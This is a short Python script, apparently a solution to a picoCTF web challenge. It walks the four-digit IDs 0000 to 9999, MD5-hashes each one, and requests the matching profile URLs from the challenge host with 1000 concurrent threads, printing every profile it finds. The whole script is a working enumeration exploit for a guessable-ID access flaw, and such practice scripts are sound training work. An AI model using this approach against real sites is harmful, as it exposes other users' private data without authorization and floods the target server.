import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor
port=57827 #aca va tu puerto
url=f"http://crystal-peak.picoctf.net:{port}/profile/user/"

def work(i):
    conv=str(i)
    if(len(conv)<4):
        conv="0"*(4-len(conv))+conv
    id=hashlib.md5(conv.encode()).hexdigest()
    response=requests.get(f"{url}{id}")
    if("User not found" not in response.text):
        print(f"{i}:",response.text)

works=range(10000)

with ThreadPoolExecutor(max_workers=1000) as executor:
    executor.map(work,works)